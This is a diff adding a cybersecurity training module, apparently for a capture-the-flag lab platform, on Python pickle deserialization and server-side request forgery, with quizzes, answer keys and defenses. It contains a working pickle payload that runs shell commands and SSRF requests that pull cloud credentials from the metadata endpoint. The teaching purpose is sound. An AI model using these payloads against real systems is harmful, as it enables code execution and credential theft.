@@ -1,0 +1,388 @@
+apiVersion: openrange.io/v1
+kind: Module
+metadata:
+  slug: deserialization-and-ssrf
+  title: 'Deserialization and SSRF: when servers trust your objects and URLs'
+  version: 0.1.0
+  difficulty: medium
+  points: 150
+  estimated_minutes: 70
+  tags:
+    - deserialization
+    - pickle
+    - ssrf
+    - cookies
+spec:
+  track: web-foundations
+  summary: >-
+    Two trust failures dominate intermediate web attacks, and both live on the
+    server side of the wire. Applications deserialize state that clients can
+    edit, turning a session cookie into an executable artifact. Applications
+    fetch URLs on the user's behalf, turning one allowed request into a
+    doorway toward internal services. This module teaches both mechanics with
+    Python pickle as the deep example, maps SSRF targets from cloud metadata
+    to internal panels, and closes with the defenses and review habits that
+    contain each class.
+  objectives:
+    - Explain serialization purposes and identify serialized data arriving from clients.
+    - Craft malicious Python pickle payloads safely inside isolated lab targets.
+    - Evaluate deserialization defenses including signatures, allowlists, and format choice.
+    - Identify server-side request forgery entry points in fetch-style features.
+    - Demonstrate SSRF impact against internal-only destinations such as metadata services.
+    - Recommend layered containment for untrusted URLs and never-deserialize rules.
+  sections:
+    - id: serialization-primer
+      title: 'Serialization primer'
+      blocks:
+        - type: prose
+          markdown: |
+            Programs constantly need to freeze live state into bytes and thaw it
+            back later or elsewhere. Sessions that survive restarts, shopping
+            carts remembered between visits, job queues carrying work between
+            machines: all of these move through serialization. JSON is the
+            friendly format everybody knows, but languages ship richer native
+            formats too. Java serialization streams, .NET formatters, Ruby
+            marshaling, and Python pickle all preserve not just data but type
+            information, sometimes entire object graphs with behavior attached.
+
+            That richness is where the danger hides, and the security question
+            is always the same one you asked studying IDOR: who controls these
+            bytes? When the answer includes browsers, the application is about
+            to reconstruct attacker-shaped objects inside its own memory.
+        - type: code
+          language: bash
+          code: |
+            $ curl -si http://target:8000/ | grep -i set-cookie
+            Set-Cookie: session=gASVJAAAAAAAAACMCHN1cGVydXNlcpSMBWFkbWlulC4=
+
+            $ echo 'gASVJAAAAAAAAACMCHN1cGVydXNlcpSMBWFkbWlulC4=' | base64 -d | xxd | head -n 3
+            00000000  80 04 95 27 00 00 00 00  00 00 00 8c 08 73 75 70  |...'.....sup...|
+            00000010  65 72 75 73 65 72 8c 05  61 64 6d 69 6e 94 2e     |eruser..admin..|
+
+            The cookie decodes to a pickle stream, opcode 0x80 marks protocol
+            two upward, and readable strings leak role names. A cookie that is
+            a program, editable by anyone who holds it, deserves your full
+            attention for the rest of this module.
+        - type: callout
+          tone: tip
+          markdown: |
+            Fingerprint serialized blobs by their openings: 0x80 for modern
+            pickle protocols, ac ed for Java streams, O: length patterns for
+            PHP object syntax, base64 wrappers hiding any of these. Recognition
+            alone puts entire bug classes on your radar instantly.
+        - type: prose
+          markdown: |
+            The cookie-shapeshifter room teaches the JSON branch of this family.
+            Crumb & Co. stores profile data as base64 JSON in a cookie and trusts
+            whatever fields reappear, so privilege strings change without any
+            exploit framework at all. Keep both variants in mind: structured
+            tampering when formats are inert, code execution when they are not.
+    - id: python-pickle-dangers
+      title: 'Python pickle dangers'
+      blocks:
+        - type: prose
+          markdown: |
+            Pickle serializes Python object graphs faithfully, and faithfulness
+            is exactly the problem. During loading, pickle honors reduction
+            opcodes that say "call this callable with these arguments," which
+            means a crafted stream executes code by design rather than by
+            accident. Documentation says it plainly: never unpickle data from
+            untrusted sources. Attackers read the same sentence as a feature.
+
+            The standard payload pattern pairs a builtin evaluation primitive
+            with a command string, wrapped in an object whose reduction fires
+            at load time. Building one takes four lines of Python, and running
+            it against lab targets only is the entire safety contract.
+        - type: code
+          language: python
+          code: |
+            import pickle, base64, os
+
+            class Pwn:
+                def __reduce__(self):
+                    return (os.system, ("id > /tmp/pwned",))
+
+            blob = base64.b64encode(pickle.dumps(Pwn())).decode()
+            print(blob)
+            # gASVKAAAAAAA...  (paste into the session cookie)
+
+            # victim side, inside the lab target only:
+            # pickle.loads(base64.b64decode(blob))
+        - type: prose
+          markdown: |
+            In the pickle-jar room, PickleJar restores session state from
+            exactly such a base64 cookie, so your crafted blob becomes the
+            server's next instruction pointer. The intended path walks a tidy
+            ladder worth memorizing. Confirm the format by decoding, confirm
+            execution with a harmless command writing a file, then aim the
+            same primitive at the flag location discovered through normal
+            enumeration. Every step produces evidence; none requires noise.
+        - type: quiz
+          question_id: deser-pickle-mechanic
+          question: 'Which pickle feature makes loading untrusted data equivalent to code execution?'
+          options:
+            - id: a
+              text: 'Base64 encoding of the stream.'
+            - id: b
+              text: 'Reduction opcodes invoke callables named by the stream during load.'
+            - id: c
+              text: 'Pickle compresses payloads.'
+            - id: d
+              text: 'Pickles embed version numbers.'
+          answer_ids: [b]
+          explanation: >
+            Pickle streams may name arbitrary callables and argument tuples,
+            honored during loads. The loader trusts the stream's choices, so
+            controlling the stream controls execution.
+    - id: deserialization-defenses-evaluated
+      title: 'Deserialization defenses evaluated'
+      blocks:
+        - type: prose
+          markdown: |
+            Defenses cluster into three honest tiers plus one dishonest habit.
+            The strong tier refuses dangerous formats entirely at trust
+            boundaries, moving sessions to signed JSON or server-side storage
+            keyed by random identifiers. The middle tier keeps a rich format
+            but wraps every byte in authentication before parsing: HMAC over
+            ciphertext, keys rotated, failure closing the door. Both work
+            because parsing happens only after origin is proven.
+
+            The dishonest habit is signing carelessly, for example HMAC over a
+            pickle while the verification code parses first and compares after,
+            or reusing a signature across contexts. Order of operations decides
+            everything, and code review reads for parse-before-verify shapes.
+        - type: code
+          language: python
+          code: |
+            import hmac, hashlib, json
+
+            def seal(payload: dict, key: bytes) -> str:
+                body = json.dumps(payload, separators=(",", ":"))
+                tag = hmac.new(key, body.encode(), hashlib.sha256).hexdigest()
+                return f"{body}.{tag}"
+
+            def unseal(token: str, key: bytes) -> dict | None:
+                body, _, tag = token.rpartition(".")
+                expect = hmac.new(key, body.encode(), hashlib.sha256).hexdigest()
+                if not hmac.compare_digest(tag, expect):
+                    return None
+                return json.loads(body)   # parse only after verify
+
+            Constant-time comparison, verify-then-parse, inert format: three
+            properties reviewers look for by name whenever tokens appear.
+        - type: prose
+          markdown: |
+            Language spread matters for reports because interviewers and
+            developers meet this bug in other costumes. Java gadget chains
+            such as CommonsCollections turn one readObject call into full
+            compromise using libraries already on the classpath; .NET
+            BinaryFormatter carries an explicit do-not-use warning; PHP
+            object injection abuses magic methods as reduction equivalents.
+            The names differ, the design rule holds everywhere: user bytes
+            become structure, structure becomes behavior somewhere.
+        - type: quiz
+          question_id: deser-defense-order
+          question: 'An app HMACs its pickled session but unpickles before verifying the tag. Why is this still vulnerable?'
+          options:
+            - id: a
+              text: 'HMAC keys are too short.'
+            - id: b
+              text: 'Execution already happened during parsing, before the check runs.'
+            - id: c
+              text: 'Base64 weakens signatures.'
+            - id: d
+              text: 'Verification requires TLS.'
+          answer_ids: [b]
+          explanation: >
+            Deserialization side effects occur at parse time. Any parsing
+            that precedes verification gives attackers execution regardless
+            of what the later check concludes, which is why order is the
+            finding.
+    - id: ssrf-mechanics
+      title: 'SSRF mechanics'
+      blocks:
+        - type: prose
+          markdown: |
+            Server-side request forgery begins with a feature everyone wants:
+            URL previews, webhook delivery, importers, PDF generators, avatar
+            fetchers. The server opens its network connection using a URL you
+            influence, which makes the server your proxy. Browsers cannot reach
+            internal addresses, but application servers sit inside trusted
+            segments, so one crafted parameter turns public features into
+            internal port scans, service interactions, and credential theft.
+
+            Entry points hide behind parameters named url, source, target,
+            feed, image, callback, or hidden inside nested JSON and XML that
+            renderers resolve later. The xxe-importer room shows the XML
+            branch, where external entities make document parsers perform the
+            fetching; nosy-files shows a portal that retrieves whatever
+            document address it receives; fetch-boy turns any URL into plain
+            text, the friendliest possible oracle for probing responses.
+        - type: code
+          language: bash
+          code: |
+            $ curl -s --get --data-urlencode 'url=http://127.0.0.1:5000/healthz' \
+                http://target:8000/preview
+            {"status":"ok","service":"internal-admin","port":5000}
+
+            $ curl -s --get --data-urlencode 'url=http://127.0.0.1:8080/' \
+                http://target:8000/preview | head -n 3
+            <html><body><h1>Ops panel</h1>
+
+            Localhost answered twice on two ports, and the second response is
+            an admin panel the internet was never supposed to see. No scan
+            fired; the application fetched politely on your behalf.
+        - type: callout
+          tone: warning
+          markdown: |
+            Probe slowly and record deliberately. Each SSRF request is the
+            server performing real work on your instruction; flooding fetch
+            endpoints toward internal ranges looks identical to attack traffic
+            and can disrupt shared lab infrastructure.
+    - id: ssrf-targets-and-pivots
+      title: 'SSRF targets and pivots'
+      blocks:
+        - type: prose
+          markdown: |
+            Impact climbs a ladder of destinations. Loopback services prove
+            reachability. Internal hostnames reveal naming conventions and
+            staging systems. Cloud environments crown everything: metadata
+            services answer on fixed addresses and hand instance credentials
+            to anyone who asks, which converts a preview widget into cloud
+            account takeover within two requests. File schemes may read local
+            secrets directly where parsers allow them.
+
+            Blind setups need out-of-band confirmation. When responses never
+            reach you, point the fetch at a listener you control inside the
+            lab network and watch the connection arrive; DNS callbacks work
+            the same way. Timing leaks help quietly too, since refused ports
+            fail fast while filtered ones hang.
+        - type: code
+          language: bash
+          code: |
+            $ curl -s --get --data-urlencode \
+                'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' \
+                http://target:8000/preview
+            lab-role
+
+            $ curl -s --get --data-urlencode \
+                'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/lab-role' \
+                http://target:8000/preview
+            {"AccessKeyId":"LABKEY...","SecretAccessKey":"LABSECRET..."}
+
+            Two requests walked from URL parameter to reusable cloud
+            credentials in a simulated environment. Real engagements treat
+            that pair as critical severity immediately, and your report
+            should quote both responses verbatim with the redaction done
+            carefully.
+        - type: prose
+          markdown: |
+            Redirects and DNS add evasion depth you will meet in hardened
+            rooms. Validators that check the initial URL can be beaten by a
+            redirect to loopback, since many clients follow hops after
+            inspection. Rebinding goes further, resolving a name twice so
+            validation sees a safe address while the client connects to an
+            internal one. Neither trick is exotic; both exist because
+            check-then-fetch is structurally fragile, which leads straight
+            into containment design.
+        - type: quiz
+          question_id: ssrf-metadata-impact
+          question: 'Why does access to a cloud metadata endpoint usually rate as critical?'
+          options:
+            - id: a
+              text: 'Metadata pages are slow and cause outages.'
+            - id: b
+              text: 'They often return credentials for cloud roles usable from anywhere.'
+            - id: c
+              text: 'They reveal the operating system version.'
+            - id: d
+              text: 'They disable logging on the instance.'
+          answer_ids: [b]
+          explanation: >
+            Instance metadata commonly serves temporary role credentials.
+            Stolen credentials typically work from any network location,
+            so a single internal fetch escalates to cloud-wide access.
+    - id: containment-and-code-review
+      title: 'Containment and code review'
+      blocks:
+        - type: prose
+          markdown: |
+            Containment layers stack because single checks keep failing.
+            Network policy comes first: outbound egress allowlists mean even
+            successful SSRF reaches nothing interesting. Application layer
+            follows: fetch through a proxy that enforces destination rules,
+            resolve once, pin the address, reject private ranges, refuse
+            redirects, and revalidate after every hop. Scheme allowlists kill
+            file and gopher surprises. None of these steps is clever; together
+            they are boring in exactly the way production needs.
+
+            Code review then hunts the patterns. Grep for fetch, urlopen,
+            requests.get, HttpClient, and curl_exec, and trace each URL
+            parameter backward to user influence. For deserialization, search
+            loads, readObject, unserialize, Marshal, and pickle, then ask the
+            only question that matters: can external input reach this line?
+        - type: code
+          language: bash
+          code: |
+            $ rg -n 'requests\.(get|post)|urlopen|curl_exec' src/
+            src/previews.py:41:    resp = requests.get(url, timeout=5)
+            src/webhooks.py:17:  resp = requests.post(cfg.hook_url, json=evt)
+
+            Line 41 takes url from the request handler above it; line 17
+            reads configuration only. Same function call, opposite verdicts:
+            tracing origin beats pattern matching, and your review notes
+            should say why each site passed or failed.
+        - type: prose
+          markdown: |
+            Close by connecting the module's halves. Deserialization and SSRF
+            share one root cause, trusting externally controlled structures,
+            whether those structures are object graphs or uniform resource
+            locators. The capstones ahead reward the pairing: pickle-jar
+            exercises executable cookies end to end, and race-to-zero waits
+            next module with state machines that trust timing just as
+            naively. Write your findings from both rooms with the finding
+            template from the HTTP module, evidence first and severity argued.
+        - type: quiz
+          question_id: ssrf-containment-layer
+          question: 'A developer adds a blocklist for 127.0.0.1 but keeps direct outbound access. What is the strongest remaining gap?'
+          options:
+            - id: a
+              text: 'Blocklists must include IPv6 too, nothing else matters.'
+            - id: b
+              text: 'Without egress control or proxy enforcement, alternate internal addresses and redirect tricks still succeed.'
+            - id: c
+              text: 'Timeouts fix the issue automatically.'
+            - id: d
+              text: 'Logging prevents exploitation entirely.'
+          answer_ids: [b]
+          explanation: >
+            Address blocklists lose to decimal forms, IPv6, DNS names, and
+            redirects. Enforcement belongs below the application, via egress
+            allowlists and pinned-resolution proxies, so bypass attempts hit
+            infrastructure instead of hope.
+  cheat_sheet: |
+    # Deserialization and SSRF
+
+    Serialized blob fingerprints:
+        0x80 .. pickle (proto >=2)     ac ed .. Java serialization
+        O:\d+".. PHP object            base64 wrapper around any
+
+    Pickle lab ladder (lab only):
+        decode cookie -> craft __reduce__ -> harmless cmd proof ->
+        aim at objective -> capture evidence per step
+
+    Token defense order:
+        verify (constant-time HMAC) BEFORE parse
+        prefer inert formats: JSON + signature
+        rotate keys; bind context into the MAC
+
+    SSRF entry params:
+        url, source, target, feed, image, callback (+nested/XML)
+
+    SSRF target ladder:
+        loopback -> internal hosts -> metadata 169.254.169.254 ->
+        file:// where allowed -> blind via own listener/DNS
+
+    Containment stack:
+        egress allowlist -> pinned-resolve proxy -> scheme allowlist ->
+        no redirects -> revalidate each hop
